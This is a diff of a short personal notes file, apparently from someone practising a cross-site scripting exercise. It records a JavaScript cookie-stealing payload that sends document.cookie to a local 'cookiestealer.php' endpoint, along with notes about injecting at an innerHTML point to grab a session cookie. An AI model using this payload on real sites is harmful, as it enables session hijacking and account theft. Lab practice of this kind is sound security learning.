@@ -1,7 +1,7 @@
 # Notes
 Where do i have to inject the eval command for executing the script? At the point where the inner html gets called. Need to get session cookie. For that i need to create a session cookie. 
 document.location = "http://127.0.0.1:4859/cookiestealer.php?c=" + document.cookie;document.cookie = "username=Null Byte";document.write(document.cookie);
-W
+
 
 
 # Action plan
